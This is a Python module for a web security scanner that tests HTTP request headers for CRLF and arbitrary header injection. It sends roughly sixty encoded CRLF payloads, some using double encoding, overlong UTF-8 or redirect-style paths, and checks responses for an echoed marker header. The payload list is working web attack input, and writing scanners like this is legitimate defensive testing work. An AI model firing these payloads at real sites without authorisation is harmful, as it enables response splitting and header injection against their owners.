
from pluck.core import BaseModule, PayloadInjector, Finding
import pluck.settings as settings
from httplib import HTTPRequest, HTTPResponse,  HTTPRequestSender
import issuelib as issuelib
import random, string



class CRLFInjectionTester(BaseModule):
    def __init__(self, request):
        super().__init__(request)
        self.name = "CRLF Injection Tester"
        self.test_parameters = []
        self.injection_points = ["headers"]
        self.excluded_parameters = []
        self.generator = None

        self.unique_string = self.generate_unique_string()
   
    # Generate the requests for the sender
    def generate_requests(self, payloads):
        # Create an injector
        injector = PayloadInjector(HTTPRequest(self.original_request.rebuild_request()))
        
        # Injection dictionary létrehozása
        injection_dict = injector.find_injection_points() # This stores an injection dictionary

        # Get the available injection points where possible to inject 
        # eg.: has a parameter
        if self.injection_points:
            available_inj = [k for k in injection_dict.keys() if injection_dict[k] and k in self.injection_points]
        else:
            available_inj = [k for k in injection_dict.keys() if injection_dict[k]]    
        
        # Collect all the points and parameters
        if not self.test_parameters:
            inj_parameters = [(point,param) for point in available_inj for param in injection_dict[point] if param not in self.excluded_parameters]
        else:
            inj_parameters = [(point,param) for point in available_inj for param in injection_dict[point] if param in self.test_parameters]
        
        # A list which will contain a generated requests
        request_list = []

        # iterate through all the points, parameters and payloads and generate available requests
        for point,param in inj_parameters:
            for payload in payloads:
                new_request = HTTPRequest(self.original_request.rebuild_request())
                injector = PayloadInjector(new_request)
                injector.inject_payload(point, param, payload)
                request_list.append((payload, point, param, new_request))

                appended = HTTPRequest(self.original_request.rebuild_request())
                injector_ap = PayloadInjector(appended)
                injector_ap.inject_payload(point, param, payload, append=True)
               
                request_list.append((payload, point, param, appended))

        modhead = HTTPRequest(self.original_request.rebuild_request())
        modhead.set_custom_header("Pluck", self.unique_string)
        request_list.append((self.unique_string, "headers", "Pluck", modhead))


        return request_list
    

    def analyze_response(self, response, request, payload, point, param):
        
        issue_found = False
        # check root in passwd
        response_headers = response.get_headers()
        if "Pluck" in response_headers:
            if response_headers["Pluck"] == self.unique_string:
                if point != "headers":
                    settings.finding_library.add_finding(name="CRLF Injection",payload=payload, point=point, param=param, module=self.name, request=request, response=response)
                    issue_found = True
                else:
                    settings.finding_library.add_finding(name="Arbitrary Header Injection",payload=payload, point=point, param=param, module=self.name, request=request, response=response)
                    issue_found = True
        
        if issue_found and not self.continue_on_success:
            self.stop_test()  


    def generate_payloads(self):
        headers = ['%0APluck:UNIQUE', '%0A%20Pluck:UNIQUE', '%20%0APluck:UNIQUE', '%23%OAPluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0APluck:UNIQUE', '%3F%0APluck:UNIQUE', 'crlf%0APluck:UNIQUE', 'crlf%0A%20Pluck:UNIQUE', 'crlf%20%0APluck:UNIQUE', 
                   'crlf%23%OAPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0APluck:UNIQUE', 'crlf%3F%0APluck:UNIQUE', 
                   '%0DPluck:UNIQUE', '%0D%20Pluck:UNIQUE', '%20%0DPluck:UNIQUE', '%23%0DPluck:UNIQUE', '%23%0APluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0DPluck:UNIQUE', '%3F%0DPluck:UNIQUE', 'crlf%0DPluck:UNIQUE', 'crlf%0D%20Pluck:UNIQUE', 'crlf%20%0DPluck:UNIQUE', 
                   'crlf%23%0DPluck:UNIQUE', 'crlf%23%0APluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0DPluck:UNIQUE', 
                   'crlf%3F%0DPluck:UNIQUE', '%0D%0APluck:UNIQUE', '%0D%0A%20Pluck:UNIQUE', '%20%0D%0APluck:UNIQUE', '%23%0D%0APluck:UNIQUE', 
                   '\\r\\nPluck:UNIQUE', '\\r\\n Pluck:UNIQUE', '\\r\\n Pluck:UNIQUE', '%5cr%5cnPluck:UNIQUE', '%E5%98%8A%E5%98%8DPluck:UNIQUE', 
                   '%E5%98%8A%E5%98%8D%0D%0APluck:UNIQUE', '%3F%0D%0APluck:UNIQUE', 'crlf%0D%0APluck:UNIQUE', 'crlf%0D%0A%20Pluck:UNIQUE',
                     'crlf%20%0D%0APluck:UNIQUE', 'crlf%23%0D%0APluck:UNIQUE', 'crlf\\r\\nPluck:UNIQUE', 'crlf%5cr%5cnPluck:UNIQUE', 
                     'crlf%E5%98%8A%E5%98%8DPluck:UNIQUE', 'crlf%E5%98%8A%E5%98%8D%0D%0APluck:UNIQUE', 'crlf%3F%0D%0APluck:UNIQUE', '%0D%0A%09Pluck:UNIQUE', 
                     'crlf%0D%0A%09Pluck:UNIQUE', '%250APluck:UNIQUE', '%25250APluck:UNIQUE', '%%0A0APluck:UNIQUE', '%25%30APluck:UNIQUE', 
                     '%25%30%61Pluck:UNIQUE', '%u000APluck:UNIQUE', '//www.google.com/%2F%2E%2E%0D%0APluck:UNIQUE', '/www.google.com/%2E%2E%2F%0D%0APluck:UNIQUE', 
                     '/google.com/%2F..%0D%0APluck:UNIQUE']

        result = [h.replace("UNIQUE", self.unique_string) for h in headers]

        return result


    def generate_unique_string(self, length=16):
        return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(length))

    def run(self):
         # Generate payloads
        print(f"[*] Executing the {self.name} module")
        payloads = self.generate_payloads()

        generated_requests = self.generate_requests(payloads)

        #print("Generated Requests Count: "+ str(len(generated_requests)))
        self.send_requests(generated_requests)


